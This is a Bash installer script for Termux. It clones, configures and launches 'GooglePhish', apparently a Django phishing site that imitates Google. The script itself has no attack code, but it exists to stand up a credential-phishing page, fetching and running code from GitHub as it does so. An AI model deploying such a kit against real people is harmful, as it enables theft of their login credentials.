    #!/data/data/com.termux/files/usr/bin/bash

    ############################################
    # ANSI variables
    # ==========================================
    ############################################
    # ANSI styles
    NORMAL="\e[0m"
    BOLD="\e[1m"
    FAINT="\e[2m"
    ITALIC="\e[3m"
    UNDERLINE="\e[4m"


    ############################################
    # ANSI Foregroud Colors
    BLACK="\e[30m"
    RED="\e[31m"
    GREEN="\e[32m"
    YELLOW="\e[33m"
    BLUE="\e[34m"
    PURPLE="\e[35m"
    CYAN="\e[36m"
    LIGHT_GRAY="\e[37m"


    ############################################
    # ANSI Background Colors
    BG_BLACK="\e[40m"
    BG_RED="\e[41m"
    BG_GREEN="\e[42m"
    BG_YELLOW="\e[43m"
    BG_BLUE="\e[44m"
    BG_PURPLE="\e[45m"
    BG_CYAN="\e[46m"
    BG_LIGHT_GRAY="\e[47m"
    # ========= end of ANSI variables =========


    ###########################################
    # Unicode variables
    # =========================================
    TICK="\u2713"
    CROSS="\u274c"
    # ======== end of Unicode variables =======


    ###########################################
    # Global variables
    # =========================================

    # ======== end of Global variables ========


    ###########################################
    # Functions
    # =========================================

    ###########################################
    # prints banner on the screen
    banner(){
        clear
        echo -e "${CYAN}"

        echo -e " ██████╗  ██████╗  ██████╗  ██████╗ ██╗     ███████╗"                  
        echo -e "██╔════╝ ██╔═══██╗██╔═══██╗██╔════╝ ██║     ██╔════╝"                  
        echo -e "██║  ███╗██║   ██║██║   ██║██║  ███╗██║     █████╗"                    
        echo -e "██║   ██║██║   ██║██║   ██║██║   ██║██║     ██╔══╝"                    
        echo -e "╚██████╔╝╚██████╔╝╚██████╔╝╚██████╔╝███████╗███████╗"                  
        echo -e " ╚═════╝  ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝"                  
        echo -e "${NORMAL}${PURPLE}"                                                   
        echo -e "██████╗ ██╗  ██╗██╗███████╗██╗  ██╗"                                   
        echo -e "██╔══██╗██║  ██║██║██╔════╝██║  ██║"                                   
        echo -e "██████╔╝███████║██║███████╗███████║"                                   
        echo -e "██╔═══╝ ██╔══██║██║╚════██║██╔══██║"                                   
        echo -e "██║     ██║  ██║██║███████║██║  ██║"                                   
        echo -e "╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝"                                   
        echo -e "${NORMAL}"                           
        echo -e "██╗███╗   ██╗███████╗████████╗ █████╗ ██╗     ██╗     ███████╗██████╗" 
        echo -e "██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██║     ██╔════╝██╔══██╗"
        echo -e "██║██╔██╗ ██║███████╗   ██║   ███████║██║     ██║     █████╗  ██████╔╝"
        echo -e "██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██║     ██╔══╝  ██╔══██╗"
        echo -e "██║██║ ╚████║███████║   ██║   ██║  ██║███████╗███████╗███████╗██║  ██║"
        echo -e "╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝"
        echo -e "${NORMAL}"
        echo -e "================================================"
        echo -e "Script by ${GREEN}dmdhrumilmistry${NORMAL}"
        echo -e "================================================\n\n"
    }

    ###########################################
    # prints info message
    print_info(){
        local message=$1
        if [ "$message" != "" ]; then
            echo -e "${BOLD}${YELLOW}[*] ${message}${NORMAL}"
        fi
    }


    ###########################################
    # prints error message
    print_err(){
        local message=$1
        if [ "$message" != "" ]; then
            echo -e "${BOLD}${RED}[${CROSS}] ${message}${NORMAL}"
        fi
    }


    ###########################################
    # prints successs message
    print_success(){
        local message=$1
        if [ "$message" != "" ]; then
            echo -e "${BOLD}${GREEN}[${TICK}] ${message}${NORMAL}"
        fi
    }


    ###########################################
    # check previous function return value
    # and take appropriate action
    check_result(){
        local failed_msg=$1
        local success_msg=$2
        local return_status=$?
        if [ $return_status != 0 ]; then
            print_err "$failed_msg"
        else
            print_success "$success_msg"
        fi
    }



    ###########################################
    # to install requirements
    install_reqs(){
        local packages=("python" "git")
        for package in "${packages[@]}"; do 
            print_info "Installing $package package."
            apt install $package -y
            local status=$?
            if [ $status != 0 ]; then
                print_err "$package installation failed! Exiting."
                exit 1
            else
                print_success "$package installed successfully."
            fi
        done
    }


    ###########################################
    # main function
    start_script(){

        banner

        print_info "Initializing Script"
        install_reqs

        
        print_info "Cloning Repo in Home Directory"
        cd $HOME
        local repo_link="https://github.com/dmdhrumilmistry/GooglePhish.git"
        git clone --depth=1 $repo_link

        check_result "Failed to clone repository" "Repo Clone successfully"
        
        cd "GooglePhish"
        print_info "Setting up Project"
        python -m pip install -r requirements.txt
        check_result "Failed to install project requirements" "Project Requirements installed successfully"

        python manage.py check
        check_result "Failed to pass project tests" "All tests passed"

        python manage.py makemigrations
        python manage.py migrate
        check_result "Failed to migrate DB" "DB migrated successfully"


        print_info "Create User"
        python manage.py createsuperuser
        check_result "Failed to create admin user" "Admin user has been created"

        python manage.py collectstatic
        check_result "Failed to collect static files" "Static Files Collected successfully"

        print_success "Project has been installed. you can run project using below command"
        echo -e "${YELLOW}python manage.py runserver${NORMAL}"

        print_info "Starting project..."
        python manage.py runserver

        return 0
    }
    # ======== end of functions ==============


    ###########################################
    # Start script execution
    start_script
